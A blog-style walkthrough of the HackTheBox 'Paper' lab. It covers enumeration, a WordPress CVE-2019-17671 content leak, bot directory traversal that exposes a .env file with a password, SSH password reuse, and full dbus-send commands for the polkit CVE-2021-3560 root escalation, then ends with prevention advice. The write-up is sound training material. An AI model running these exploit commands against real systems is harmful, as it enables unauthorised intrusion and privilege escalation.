---
title: "Hackthebox Paper Lab"
date: 2025-02-09
media_subpath: /assets/posts/2025-02-09-hackthebox-paper-lab
categories:
- ctf
- red team
tags:
- linux
- hackthebox
- file inclusion
- red team
published: false
layout: post
---

## Initial Enumeration

Starting with an nmap scan of the machine:  

```sh
nmap -p- 10.10.11.143
```  

We discover 3 open ports:  
- 22 SSH
- 80 HTTP
- 443 HTTPS  

Visiting port 80 in our web browser shows us a test page for a HTTP server, from this we get the OS of the target, which is CentOS but not much else information. My first
idea is to start fuzzing for pages and directories.  

```sh
gobuster dir -u http://10.10.11.143:80/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```  

While gobuster is running I'll also try to find any other information about the target, my next plan is to look at the requests being exchanged between client and server in
burpsuite. We reload the page with the burpsuite proxy activated and intercept mode on. In the response we see the following HTTP headers:

```
HTTP/1.1 403 Forbidden
Date: Wed, 12 Feb 2025 09:58:23 GMT
Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9
X-Backend-Server: office.paper
Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT
ETag: "30c0b-5c5c7fdeec240"
Accept-Ranges: bytes
Content-Length: 199691
Connection: close
Content-Type: text/html; charset=UTF-8
```

We get the version of Apache running on the web server but there is also another interesting header, `X-Backend-Server`. A google search for what this header tells us that
this header should be suppressed and can expose information about backend systems, [article here](https://www.zaproxy.org/docs/alerts/10039/){:target="_blank"}. Like most other HTB machines this lab probably uses [Virtual Hosting](https://en.wikipedia.org/wiki/Virtual_hosting){:target="_blank"} so we add the domain `office.paper` to our `/etc/hosts` file with the target machines IP and visit the domain and see a site for a paper company.  

![paper_1.png](paper_1.png)  

By this time the gobuster fuzzing we started doing earlier has found nothing apart from a /manual page so lets restart it again using the `office.paper` domain.  

```sh
gobuster dir -u http://office.paper/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
```  

Now that we have a domain we can also perform subdomain enumeration as well.  

```sh
gobuster dns -d office.paper -w /usr/share/wordlists/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
```  

Our enumeration for pages and directories for `office.paper` discovered some wordpress pages, `wp-admin`, `wp-content`, etc. We check which version of wordpress the webpage is running using the Wappalyzer firefox extension and get wordpress version 5.2.3, googling for vulnerabiltiies related to this wordpress version gives us an [exploit-db page](https://www.exploit-db.com/exploits/47690){:target="_blank"} for [CVE-2019-17671](https://nvd.nist.gov/vuln/detail/CVE-2019-17671){:target="_blank"}. The vulnerability states that:  

"In WordPress before 5.2.4, unauthenticated viewing of certain content is possible because the static query property is mishandled."  

and the exploit-db page states that:  

"...we know that adding `?static=1` to a wordpress URL should leak its secret content"  

So we try visitng the URL `office.paper/?static=1` which reveals some secret content.  

![paper_2.png](paper_2.png)  

From this content we get the secret registration URL:  

```
http://chat.office.paper/register/8qozr226AhkCHZdyY
```  

If we also look back at the result of our subdomain enumeration we also found this subdomain `chat.office.paper`. We add it to `/etc/hosts` then visit the secret registration URL and find a login page for a rocket chat service.  

![paper_4.png](paper_4.png)  

We go through the registration process and then we see the different chat channels

![paper_3.png](paper_3.png)  

## Initial Foothold

Scrolling through the `#general` channel we see a bot which allows workers to interact with the web server, while we don't have permissions to message in `#general` we can send the bot a private message. We send `help` to get a list of commands we can use and see we can look at different files on the server. Using the `list` command we see were in the directory `/sales/`. Testing for file inclusion we send `list ../`, the test works and we get a listing for the directory.  

We also see the `user.txt` flag from this and try to access it but get Access denied. We perform some general enumeration of the different files and directories we can access like `../.config`, during this enumeration we come across a directory named `hubot` which is likely the root directory for files for the chatbot. In this directory there is a .env file which contains some sensitive data.  

```
 <!=====Contents of file ../hubot/.env=====>
<!=====Contents of file ../hubot/.env=====>
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
export ROCKETCHAT_URL='http://127.0.0.1:48320'
export ROCKETCHAT_USER=recyclops
export ROCKETCHAT_PASSWORD=Queenofblad3s!23
export ROCKETCHAT_USESSL=false
export RESPOND_TO_DM=true
export RESPOND_TO_EDITED=true
export PORT=8000
export BIND_ADDRESS=127.0.0.1
<!=====End of file ../hubot/.env=====>
<!=====End of file ../hubot/.env=====>  
```  

We get the credentials recyclops:Queenofblad3s!23. During the enumeration we also find that dwight is another user on the server since we see he has a home directory from the command `list ../../../../home`. We know from the chat log that the bot was developed by dwight so we can do a check to see if he used the same passwords for the chatbot account and his user account.  

```sh
ssh dwight@10.10.11.143
```  

We use the password `Queenofblad3s!23` and get a shell and from this get the user flag.  

![paper_5.png](paper_5.png)  

## Privilege Escalation

We perform some general enumeration to find any commands we can run as sudo, cron jobs running, other users, but we get the privilege escalation vector from running the linpeas shell script.  

**On our local machine in the directory containing the linpeas script**  

```sh
python -m http.server 1234
```  

**On target machine in ssh session**  

```sh
curl <YOUR-IP>:1234/linpeas.sh -o linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```  

linpeas tells us its vulnerable to [CVE-2021-3560](https://nvd.nist.gov/vuln/detail/cve-2021-3560). I've attempted exploiting this vulnerability before in [the Cap HTB lab]({% post_url 2025-02-05-hackthebox-cap-lab %}#privilege-escalation) but it didn't work on that machine, we'll try it again here.  

The exploit exploits the polkit system service which is used for authentication, polkit will decide whether or not you are allowed to do it. To trigger polkit from command line we use the `dbus-send` command.  

The vulnerability is triggered by starting a `dbus-send` command but killing it while polkit is still in the middle of processing the request.

For more explanation on how the exploit works find the article [here](https://github.blog/security/vulnerability-research/privilege-escalation-polkit-root-on-linux-with-bug/).  

We'll first measure how long it takes to run the `dbus-send` command normally using:  

```sh
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1
```

I ran it a few times and was getting around the `0.050s` mark, so I'll need to kill the command in `0.025s`:    

```sh
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:boris string:"Boris Ivanovich Grishenko" int32:1 & sleep 0.025s ; kill $!
```  

This creates the user `boris` and when running the command `id boris` we see he is already part of the wheel group.  

Now we need to set the password for `boris` using the SetPassword dbus method which requires a password hash, so we generate the hash using the command:  

```sh
openssl passwd -5 boris
$5$NZ5DVoaEF8pPZTq3$rsROsTG4WiRL7sH01hEJEw4bcgMwb6gJlUgnXPfCH4A
```  

We input this hash into the command:  

```sh
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1005 org.freedesktop.Accounts.User.SetPassword string:'$5$Fb4OJPwdlUS7ISsT$jePFjfqrQSPKSpOlJ.i5zoHPaA10W5aGOkBnpcI2ykC' string:GoldenEye & sleep 0.025s ; kill $!
```  

For the above command make sure to input your own hash and user id for boris.  

This might take a few tries and experimentation with the timing but eventually it should work and you get a shell as the user `boris`, you can then run `sudo su` and get an elevated shell to get the root flag in `/root/root.txt`:  

![paper_6.png](paper_6.png)  

## Machine Review

### What was Learned

This machine involved:  
- Analysing HTTP responses (used Burp Suite) to find exposed information
- Exploiting CVE-2019-17671 (wordpress CVE which allows users to potentially view content which they shouldn't have permissions to view)
- Exploiting a file inclusion vulnerability to enumerate sensitive information from a server
- Privilege escalation via polkit (CVE-2021-3560)

### How would I prevent this vulnerability

- Configure the web server to suppress X-Backend-Server headers in HTTP responses.
- Use an updated wordpress version to prevent CVE-2019-17671
- Patch the bot so it is not able to allow users to send commands which involve accessing information outside of the web server root directory, perform some form of access control check (E.g. check if a file is in a whitelist before reading)
- Use an updated version of polkit to prevent CVE-2021-3560









